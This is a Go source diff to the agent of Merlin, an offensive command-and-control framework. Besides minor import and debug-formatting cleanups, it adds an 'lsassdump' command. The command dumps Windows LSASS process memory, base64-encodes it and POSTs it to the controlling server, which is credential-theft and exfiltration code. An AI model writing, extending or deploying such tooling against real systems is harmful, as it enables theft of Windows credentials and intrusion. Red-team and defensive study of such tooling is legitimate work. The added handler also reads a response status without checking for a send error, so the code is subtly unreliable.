@@ -18,6 +18,7 @@
 package agent
 
 import (
+
 	// Standard
 	"bytes"
 	"crypto/sha1"
@@ -41,11 +42,11 @@ import (
 	"github.com/fatih/color"
 	"github.com/lucas-clemente/quic-go"
 	"github.com/lucas-clemente/quic-go/h2quic"
-	"github.com/satori/go.uuid"
+	uuid "github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg"
+	merlin "github.com/Ne0nd0g/merlin/pkg"
 	"github.com/Ne0nd0g/merlin/pkg/core"
 	"github.com/Ne0nd0g/merlin/pkg/messages"
 )
@@ -290,7 +291,7 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 	}
 	if a.Debug {
 		message("debug", "HTTP Response:")
-		message("debug", fmt.Sprintf("%s", resp))
+		message("debug", fmt.Sprintf("%+v", resp))
 	}
 	if resp.StatusCode != 200 {
 		a.FailedCheckin++
@@ -353,7 +354,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 	if a.Debug {
 		message("debug", "HTTP Response:")
 		message("debug", fmt.Sprintf("ContentLength: %d", resp.ContentLength))
-		message("debug", fmt.Sprintf("%s", resp))
+		message("debug", fmt.Sprintf("%+v", resp))
 	}
 
 	if resp.StatusCode != 200 {
@@ -556,6 +557,70 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 			json.Unmarshal(payload, &p)
 
 			switch p.Command {
+			case "lsassdump":
+				if a.Verbose {
+					message("note", "Received dump lsass request")
+				}
+				//get lsass minidump
+				fileData, fileDataErr := dumpLsass()
+
+				//copied and pasted from upload func, modified appropriately
+				if fileDataErr != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error dumping lsass"))
+						message("warn", fmt.Sprintf("%s", fileDataErr.Error()))
+					}
+					errMessage := fmt.Sprintf("There was an error dumping lsass\r\n")
+					errMessage += fileDataErr.Error()
+					c := messages.CmdResults{
+						Job:    p.Job,
+						Stderr: errMessage,
+					}
+					if a.Verbose {
+						message("note", "Sending error message to sever.")
+					}
+					k, _ := json.Marshal(c)
+					g.Type = "CmdResults"
+					g.Payload = (*json.RawMessage)(&k)
+
+				} else {
+					fileHash := sha1.New()
+					io.WriteString(fileHash, string(fileData))
+
+					if a.Verbose {
+						message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
+							//p.FileLocation,
+							len(fileData),
+							fileHash.Sum(nil)))
+					}
+					c := messages.FileTransfer{
+						FileLocation: "lsass.dmp",
+						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
+						IsDownload:   true,
+						Job:          p.Job,
+					}
+
+					k, _ := json.Marshal(c)
+					g.Type = "FileTransfer"
+					g.Payload = (*json.RawMessage)(&k)
+
+				}
+
+				b2 := new(bytes.Buffer)
+				json.NewEncoder(b2).Encode(g)
+				resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
+				if respErr != nil {
+					if a.Verbose {
+						message("warn", "There was an error sending the FileTransfer message to the server")
+						message("warn", fmt.Sprintf("%s", respErr.Error()))
+					}
+				}
+				if resp2.StatusCode != 200 {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
+					}
+				}
+
 			case "kill":
 				if a.Verbose {
 					message("note", "Received Agent Kill Message")
@@ -907,7 +972,7 @@ func (a *Agent) agentInfo(host string, client *http.Client) {
 	}
 	if a.Debug {
 		message("debug", "HTTP Response:")
-		message("warn", fmt.Sprintf("%s", resp))
+		message("warn", fmt.Sprintf("%+v", resp))
 	}
 	if resp.StatusCode != 200 {
 		a.FailedCheckin++
